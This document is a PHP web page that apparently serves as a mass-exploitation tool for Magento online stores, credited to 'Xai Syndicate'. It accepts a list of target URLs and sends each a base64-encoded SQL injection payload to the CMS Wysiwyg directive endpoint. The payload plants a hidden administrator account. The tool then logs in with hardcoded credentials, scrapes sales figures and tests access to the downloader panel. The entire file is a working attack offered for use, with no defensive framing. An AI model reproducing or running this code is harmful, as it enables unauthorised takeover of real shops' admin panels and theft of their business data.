<title>Magent0 Auto eXploit </title>
<?php
include("../head.php");
?>
<br><br><br><center>
<form method="post" action="">
<textarea placeholder="http://jembut.com" class="form-control con7" rows="10" name="target" required></textarea><br><br>
<input class="kntd" type=submit name=submit value="Start"><br>
</form>
</p>

<!-- udahan textareanya -->

<!-- start -->

<?php 

error_reporting(0);
set_time_limit(0);

function bersihkan($htmltags) {
	$htmltags = str_replace('<span class="price">','',$htmltags);
	$htmltags = str_replace('</span>','',$htmltags);
	return $htmltags;
	
}

///postdata

$postadm = "filter=cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTtTRVQgQFNBTFQgPSAncnAnO1NFVCBAUEFTUyA9IENPTkNBVChNRDUoQ09OQ0FUKCBAU0FMVCAsICdzdHVwaWQ0OCcpICksIENPTkNBVCgnOicsIEBTQUxUICkpO1NFTEVDVCBARVhUUkEgOj0gTUFYKGV4dHJhKSBGUk9NIGFkbWluX3VzZXIgV0hFUkUgZXh0cmEgSVMgTk9UIE5VTEw7SU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgZmlyc3RuYW1lYCwgYGxhc3RuYW1lYCxgZW1haWxgLGB1c2VybmFtZWAsYHBhc3N3b3JkYCxgY3JlYXRlZGAsYGxvZ251bWAsYHJlbG9hZF9hY2xfZmxhZ2AsYGlzX2FjdGl2ZWAsYGV4dHJhYCxgcnBfdG9rZW5gLGBycF90b2tlbl9jcmVhdGVkX2F0YCkgVkFMVUVTICgnRmlyc3RuYW1lJywnTGFzdG5hbWUnLCdlbWFpbEBleGFtcGxlLmNvbScsJ3N0dXBpZCcsQFBBU1MsTk9XKCksMCwwLDEsQEVYVFJBLE5VTEwsIE5PVygpKTtJTlNFUlQgSU5UTyBgYWRtaW5fcm9sZWAgKHBhcmVudF9pZCx0cmVlX2xldmVsLHNvcnRfb3JkZXIscm9sZV90eXBlLHVzZXJfaWQscm9sZV9uYW1lKSBWQUxVRVMgKDEsMiwwLCdVJywoU0VMRUNUIHVzZXJfaWQgRlJPTSBhZG1pbl91c2VyIFdIRVJFIHVzZXJuYW1lID0gJ3N0dXBpZCcpLCdGaXJzdG5hbWUnKTs%3D&___directive=e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&forwarded=1";
$postlog = "form_key=3ryAIBlm7bJ3naj9&login%5Busername%5D=con7ext&login%5Bpassword%5D=c7ear2234";
$postdwn = "username=con7ext&password=c7ear2234";
$pageadm = "/admin/Cms_Wysiwyg/directive/index/";
$pagelog = "/admin/";
$pagedwn = "/downloader/";

function con7ext_CURL($url,$data,$page) {
$ch = curl_init(); 
curl_setopt ($ch, CURLOPT_URL, $url.$page); 
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, $data); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_POST, 1); 
$headers  = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';

curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt ($ch, CURLOPT_HEADER, 1);
$result = curl_exec ($ch);
curl_close($ch);
return $result;
}
print $banner;

if(isset($_POST['target'])){
$j=explode("\r\n",$_POST['target']);
foreach($j as $site){ 

	echo'<font color="red">';
print "Checking, Please wait!
<br>";
echo'</font>';
$hajar = con7ext_CURL($site , $postadm, $pageadm);

if(preg_match('#200 OK#', $hajar)) {
	$expres = "Success";
	$ceklog = con7ext_CURL($site , $postlog, $pagelog);
	
if(preg_match('#302 Moved#', $ceklog)) {
	preg_match_all('#<span class="price">(.*?)</span>#si', $ceklog, $match);
    foreach($match as $val)
    {
	$ltm = $val[0];
    $avo = $val[1];
	break;
    }
	$admlog = "Success";
	$user = "con7ext";
	$pass = "c7ear2234";
	$cekdwn = con7ext_CURL($site , $postdwn, $pagedwn);
	if(preg_match('#Return to Admin#', $cekdwn)) {
	$dwnlog = "Login Success";
}else {
	$dwnlog = "Login Failed";
}
}else {
	$admlog = "Failed";
	$user = "NULL";
	$pass = "NULL";
}
}else {
	$admlog = "Failed";
	$expres = "Failed";
	$user = "NULL";
	$pass = "NULL";
	$dwnlog = "Login Failed";
	$ltm = "NULL";
    $avo = "NULL";
}

///echo result
$logger = '
<br>
    <font color="blue">
	<h4>[ '.$site.' ]</h4></font><br>
	Exploiting	: <font color="green">'.$expres.'</font><br>
	Login Admin	: <font color="green">'.$admlog.'</font><br>
	Lifetime Sales: <font color="gold">'.bersihkan($ltm).'</font><br>
	Average Order	: <font color="gold">'.bersihkan($avo).'</font><br>
	Downloader	: <font color="red">'.$dwnlog.'</font><br>
	Username	:<font color="cyan"><b> '.$user.'</font></b><br>
	Password	:<font color="cyan"><b> '.$pass.'</font></b><br>
	<br><br>
	<font color="red">
	<h2>- [ Xai Syndicate ] -</h2>';
	echo $logger;
///diilangin
}
}
?>